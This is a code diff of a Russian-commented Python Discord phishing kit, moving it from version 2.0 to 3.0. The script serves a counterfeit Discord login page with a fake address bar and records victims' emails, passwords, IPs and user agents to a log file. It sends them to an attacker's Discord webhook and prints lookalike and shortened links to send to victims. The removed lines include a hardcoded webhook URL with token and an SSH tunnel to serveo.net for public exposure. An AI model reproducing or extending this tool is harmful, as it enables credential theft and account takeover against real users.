@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
-# DISCORD PHISHING ДЛЯ ISH - С МАСКИРОВКОЙ ССЫЛКИ
+# DISCORD PHISHING ДЛЯ ISH - С МЕНЮ НАСТРОЕК
 
 import http.server
 import socketserver
 import json
-import urllib.parse
 import datetime
 import threading
 import time
@@ -12,11 +11,115 @@ import subprocess
 import os
 import random
 import string
+import sys
 
 # ============================================
-# ТВОЙ DISCORD WEBHOOK (ВСТАВЬ СЮДА!)
+# ФАЙЛ ДЛЯ СОХРАНЕНИЯ НАСТРОЕК
 # ============================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1336186422586716201/2erCI9eFp6GpUQw4OS0TNUqOqwsStkAC-iWbH7dGEW78k2Zk4L-Qyec6r7-vrABJx2rS"
+CONFIG_FILE = '/sdcard/phish_config.json'
+LOG_FILE = '/sdcard/discord_logs.txt'
+
+# ============================================
+# ФУНКЦИИ ДЛЯ РАБОТЫ С НАСТРОЙКАМИ
+# ============================================
+
+def load_config():
+    """Загружает настройки из файла"""
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            pass
+    return {"webhook": "", "telegram_token": "", "telegram_chat": ""}
+
+def save_config(config):
+    """Сохраняет настройки в файл"""
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f)
+
+def show_menu():
+    """Показывает меню настроек"""
+    config = load_config()
+    
+    while True:
+        print("\n" + "="*60)
+        print("⚙️  МЕНЮ НАСТРОЕК PHISHING")
+        print("="*60)
+        print(f"1. Установить Discord Webhook (текущий: {config['webhook'][:30]}...)" if config['webhook'] else "1. Установить Discord Webhook (не настроен)")
+        print(f"2. Установить Telegram Bot (текущий: {config['telegram_token'][:15]}...)" if config['telegram_token'] else "2. Установить Telegram Bot (не настроен)")
+        print("3. Просмотреть все сохраненные данные")
+        print("4. Очистить файл с данными")
+        print("5. Запустить фишинг сервер")
+        print("0. Выход")
+        print("="*60)
+        
+        choice = input("Выберите действие: ").strip()
+        
+        if choice == "1":
+            new_webhook = input("Введите Discord Webhook URL: ").strip()
+            if new_webhook:
+                config['webhook'] = new_webhook
+                save_config(config)
+                print("✅ Webhook сохранен!")
+        
+        elif choice == "2":
+            token = input("Введите Telegram Bot Token: ").strip()
+            chat = input("Введите Telegram Chat ID: ").strip()
+            if token and chat:
+                config['telegram_token'] = token
+                config['telegram_chat'] = chat
+                save_config(config)
+                print("✅ Telegram настройки сохранены!")
+        
+        elif choice == "3":
+            view_logs()
+        
+        elif choice == "4":
+            if os.path.exists(LOG_FILE):
+                os.remove(LOG_FILE)
+                print("✅ Логи очищены!")
+            else:
+                print("❌ Файл с логами не найден")
+        
+        elif choice == "5":
+            if not config['webhook']:
+                print("❌ Сначала настрой Discord Webhook!")
+                continue
+            start_phishing_server(config)
+        
+        elif choice == "0":
+            print("Выход...")
+            sys.exit(0)
+
+def view_logs():
+    """Просмотр сохраненных логов"""
+    if not os.path.exists(LOG_FILE):
+        print("❌ Логов пока нет")
+        return
+    
+    try:
+        with open(LOG_FILE, 'r') as f:
+            logs = f.readlines()
+        
+        print("\n" + "="*60)
+        print(f"📁 СОХРАНЕННЫЕ ДАННЫЕ ({len(logs)} записей)")
+        print("="*60)
+        
+        for i, log in enumerate(logs[-10:], 1):  # Показываем последние 10
+            try:
+                data = json.loads(log.strip())
+                print(f"\n{i}. Email: {data.get('email', 'N/A')}")
+                print(f"   Пароль: {data.get('password', 'N/A')}")
+                print(f"   IP: {data.get('ip', 'N/A')}")
+                print(f"   Время: {data.get('timestamp', 'N/A')}")
+                print("-"*40)
+            except:
+                print(f"   {log.strip()}")
+        
+        print("="*60)
+    except Exception as e:
+        print(f"❌ Ошибка чтения логов: {e}")
 
 # ============================================
 # ФУНКЦИЯ ДЛЯ СОЗДАНИЯ МАСКИРОВАННЫХ ССЫЛОК
@@ -34,50 +137,30 @@ def generate_masked_links(real_url):
         f"https://discord.com-login.{''.join(random.choices(string.ascii_lowercase, k=7))}.com",
         f"https://discord-security.com/{''.join(random.choices(string.ascii_lowercase, k=10))}",
         f"https://discord-verify.{''.join(random.choices(string.ascii_lowercase, k=5))}.net",
+        f"https://discord-nitro.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
+        f"https://discord.com.verify.ru/{''.join(random.choices(string.ascii_lowercase, k=6))}",
         
         # Через сокращатели ссылок
         f"https://bit.ly/3{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}",
         f"https://tinyurl.com/discord-{''.join(random.choices(string.ascii_lowercase, k=5))}",
         f"https://clck.ru/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}",
+        f"https://rb.gy/{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}",
+        f"https://cutt.ly/discord_{''.join(random.choices(string.ascii_lowercase, k=4))}",
         
         # Через сервисы с Discord в URL
         f"https://discord.gg/{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}",
         f"https://discord.media/{''.join(random.choices(string.ascii_lowercase, k=6))}",
+        f"https://discord.gifts/{''.join(random.choices(string.ascii_uppercase, k=8))}",
         
-        # Через shortlink сервисы с подменой
-        f"https://rb.gy/{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}",
-        f"https://cutt.ly/discord_{''.join(random.choices(string.ascii_lowercase, k=4))}",
-        
-        # Самые правдоподобные для Discord
+        # НитроПодарки
         f"https://discord.com/nitro/{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}",
         f"https://discordapp.com/gifts/{''.join(random.choices(string.ascii_lowercase, k=10))}",
-        f"https://discord.gifts/{''.join(random.choices(string.ascii_uppercase, k=8))}",
     ]
     
-    return masks[:15]  # Возвращаем 15 вариантов
-
-def create_shortlink_bitly(long_url):
-    """Создание короткой ссылки через bitly (нужен API ключ)"""
-    try:
-        import requests
-        # Без API ключа bitly не работает, но покажем пример
-        return f"https://bit.ly/3{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
-    except:
-        return None
-
-def create_shortlink_tinyurl(long_url):
-    """Создание короткой ссылки через tinyurl (без API)"""
-    try:
-        import requests
-        response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
-        if response.status_code == 200:
-            return response.text.strip()
-    except:
-        pass
-    return None
+    return masks
 
 # ============================================
-# ТОЧНАЯ КОПИЯ DISCORD СТРАНИЦЫ
+# HTML СТРАНИЦА - ТОЧНАЯ КОПИЯ DISCORD
 # ============================================
 HTML_PAGE = """<!DOCTYPE html>
 <html>
@@ -101,6 +184,18 @@ HTML_PAGE = """<!DOCTYPE html>
             border-radius: 8px;
             padding: 32px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        }
+        .fake-url {
+            background: #1E1F22;
+            color: #B5BAC1;
+            padding: 8px 12px;
+            border-radius: 4px 4px 0 0;
+            font-size: 12px;
+            border-bottom: 1px solid #3C3F45;
+            margin-bottom: 16px;
+        }
+        .fake-url span {
+            color: #00A8FC;
         }
         .logo {
             text-align: center;
@@ -199,23 +294,10 @@ HTML_PAGE = """<!DOCTYPE html>
             text-align: center;
             display: none;
         }
-        /* Стиль адресной строки (для браузера) */
-        .fake-url {
-            background: #1E1F22;
-            color: #B5BAC1;
-            padding: 8px 12px;
-            border-radius: 4px 4px 0 0;
-            font-size: 12px;
-            border-bottom: 1px solid #3C3F45;
-        }
-        .fake-url span {
-            color: #00A8FC;
-        }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <!-- Фейковая адресная строка (для большей реалистичности) -->
         <div class="fake-url">
             🔒 <span>https://</span>discord.com/login
         </div>
@@ -296,7 +378,13 @@ HTML_PAGE = """<!DOCTYPE html>
 </body>
 </html>"""
 
+# ============================================
+# HTTP HANDLER С ОТПРАВКОЙ В WEBHOOK
+# ============================================
+
 class PhishingHandler(http.server.SimpleHTTPRequestHandler):
+    webhook_url = ""
+    
     def do_GET(self):
         if self.path == '/':
             self.send_response(200)
@@ -313,25 +401,29 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
             post_data = self.rfile.read(content_length)
             data = json.loads(post_data.decode('utf-8'))
             
-            # Добавляем IP
+            # Добавляем IP и время
             data['ip'] = self.client_address[0]
             data['timestamp'] = str(datetime.datetime.now())
             
-            # Выводим в консоль
-            print("\n" + "="*50)
-            print("🔴 ПОЛУЧЕНЫ ДАННЫЕ:")
+            # ВЫВОД В КОНСОЛЬ
+            print("\n" + "="*60)
+            print("🔴 ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ!")
+            print("="*60)
             print(f"📧 Email: {data['email']}")
-            print(f"🔑 Password: {data['password']}")
+            print(f"🔑 Пароль: {data['password']}")
             print(f"🌐 IP: {data['ip']}")
             print(f"🕐 Время: {data['timestamp']}")
-            print("="*50)
+            print(f"📱 User-Agent: {data.get('userAgent', 'N/A')[:50]}...")
+            print("="*60)
             
-            # Сохраняем в файл
-            with open('/sdcard/discord_logs.txt', 'a') as f:
+            # СОХРАНЕНИЕ В ФАЙЛ
+            with open(LOG_FILE, 'a') as f:
                 f.write(json.dumps(data) + '\n')
+            print(f"💾 Сохранено в: {LOG_FILE}")
             
-            # Отправляем в Discord
-            self.send_to_discord(data)
+            # ОТПРАВКА В DISCORD WEBHOOK
+            if self.webhook_url:
+                self.send_to_discord(data)
             
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
@@ -339,15 +431,61 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({'status': 'ok'}).encode())
     
     def send_to_discord(self, data):
+        """Отправка данных в Discord Webhook"""
         try:
             import requests
+            
+            # Форматируем сообщение
             webhook_data = {
-                "content": f"**🔴 НОВЫЙ ЛОГИН DISCORD**\n\n**Email:** `{data['email']}`\n**Пароль:** `{data['password']}`\n**IP:** `{data['ip']}`\n**Время:** `{data['timestamp']}`"
+                "content": "",  # Пустой content для embed
+                "embeds": [{
+                    "title": "🔴 НОВЫЙ ЛОГИН DISCORD",
+                    "color": 15548997,
+                    "fields": [
+                        {
+                            "name": "📧 Email/Логин",
+                            "value": f"```{data['email']}```",
+                            "inline": False
+                        },
+                        {
+                            "name": "🔑 Пароль",
+                            "value": f"```{data['password']}```",
+                            "inline": False
+                        },
+                        {
+                            "name": "🌐 IP Адрес",
+                            "value": f"```{data['ip']}```",
+                            "inline": True
+                        },
+                        {
+                            "name": "🕐 Время",
+                            "value": f"```{data['timestamp']}```",
+                            "inline": True
+                        },
+                        {
+                            "name": "📱 User Agent",
+                            "value": f"```{data.get('userAgent', 'N/A')[:100]}...```",
+                            "inline": False
+                        }
+                    ],
+                    "footer": {
+                        "text": f"Phishing Server | {data['ip']}"
+                    }
+                }]
             }
-            requests.post(WEBHOOK_URL, json=webhook_data)
-            print("✅ Отправлено в Discord")
-        except:
-            print("❌ Не удалось отправить в Discord")
+            
+            response = requests.post(self.webhook_url, json=webhook_data)
+            if response.status_code == 204:
+                print("✅ Отправлено в Discord Webhook")
+            else:
+                print(f"❌ Ошибка отправки в Discord: {response.status_code}")
+                
+        except Exception as e:
+            print(f"❌ Ошибка отправки в Discord: {e}")
+
+# ============================================
+# ЗАПУСК СЕРВЕРА
+# ============================================
 
 def get_local_ip():
     try:
@@ -359,93 +497,34 @@ def get_local_ip():
         pass
     return '127.0.0.1'
 
-def create_serveo_link(port):
-    """Создание публичной ссылки через serveo.net"""
-    try:
-        print("\n🔗 Создаю публичную ссылку через serveo.net...")
-        
-        # Генерируем случайное имя для поддомена
-        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
-        
-        # Запускаем SSH туннель в фоне
-        ssh_command = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
-        process = subprocess.Popen(
-            ssh_command.split(),
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        
-        time.sleep(3)
-        
-        public_url = f"https://{subdomain}.serveo.net"
-        print(f"\n✅ ПУБЛИЧНАЯ ССЫЛКА: {public_url}")
-        
-        # Генерируем маскированные ссылки
-        print("\n" + "="*60)
-        print("🎭 МАСКИРОВАННЫЕ ССЫЛКИ (отправь жертве):")
-        print("="*60)
-        
-        masked_links = generate_masked_links(public_url)
-        for i, link in enumerate(masked_links[:10], 1):
-            print(f"{i}. {link}")
-        
-        print("\n" + "="*60)
-        print("📌 Реальная ссылка (только для тебя):")
-        print(f"   {public_url}")
-        print("="*60)
-        
-        # Отправляем ссылки в Discord
-        try:
-            import requests
-            webhook_data = {
-                "content": f"**🎭 ФИШИНГ ССЫЛКИ ГОТОВЫ**\n\n**Реальная:** {public_url}\n\n**Маскированные:**\n" + "\n".join(masked_links[:5])
-            }
-            requests.post(WEBHOOK_URL, json=webhook_data)
-        except:
-            pass
-        
-    except Exception as e:
-        print(f"Ошибка: {e}")
-
-def create_localhost_run_link(port):
-    """Альтернативный способ через localhost.run"""
-    try:
-        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
-        print(f"\n🔗 Альтернативная ссылка:")
-        print(f"   ssh -R {subdomain}:80:localhost:{port} localhost.run")
-    except:
-        pass
-
-def main():
+def start_phishing_server(config):
+    """Запуск фишинг сервера"""
     PORT = 8080
     
-    print("""
-    ╔══════════════════════════════════════════╗
-    ║   DISCORD PHISHING ДЛЯ ISH v2.0          ║
-    ║   С МАСКИРОВКОЙ ССЫЛОК                   ║
-    ║        by LEDIAN PREMIUM                 ║
-    ╚══════════════════════════════════════════╝
-    """)
+    print("\n" + "="*60)
+    print("🚀 ЗАПУСК ФИШИНГ СЕРВЕРА")
+    print("="*60)
     
-    print(f"📁 Логи: /sdcard/discord_logs.txt")
-    print(f"🔗 Webhook: {WEBHOOK_URL[:50]}...")
+    # Устанавливаем webhook для обработчика
+    PhishingHandler.webhook_url = config['webhook']
     
     # Получаем локальный IP
     local_ip = get_local_ip()
     
-    print("\n" + "="*60)
-    print("🚀 ЗАПУСК СЕРВЕРА...")
-    print("="*60)
-    print(f"\n📌 Локальный доступ:")
+    print(f"\n📌 Локальные ссылки:")
     print(f"   http://localhost:{PORT}")
     print(f"   http://{local_ip}:{PORT}")
     
-    # Создаем публичную ссылку в отдельном потоке
-    threading.Thread(target=create_serveo_link, args=(PORT,), daemon=True).start()
+    # Генерируем маскированные ссылки
+    print("\n🎭 Маскированные ссылки для отправки:")
+    masked_links = generate_masked_links(f"http://{local_ip}:{PORT}")
+    for i, link in enumerate(masked_links[:15], 1):
+        print(f"{i:2d}. {link}")
     
-    print("\n⏳ Ожидание данных...")
-    print("(нажми Ctrl+C для остановки)\n")
+    print("\n" + "="*60)
+    print("⏳ Сервер запущен. Ожидание данных...")
+    print("📁 Логи сохраняются в: " + LOG_FILE)
+    print("="*60 + "\n")
     
     # Запускаем сервер
     handler = PhishingHandler
@@ -456,5 +535,21 @@ def main():
             print("\n\n❌ Сервер остановлен")
             httpd.shutdown()
 
+# ============================================
+# ТОЧКА ВХОДА
+# ============================================
+
 if __name__ == '__main__':
-    main()
+    # Создаем папку для логов если нужно
+    os.makedirs('/sdcard', exist_ok=True)
+    
+    print("""
+    ╔══════════════════════════════════════════╗
+    ║   DISCORD PHISHING ДЛЯ ISH v3.0          ║
+    ║   С МЕНЮ ВВОДА WEBHOOK                   ║
+    ║        by LEDIAN PREMIUM                 ║
+    ╚══════════════════════════════════════════╝
+    """)
+    
+    # Показываем меню
+    show_menu()
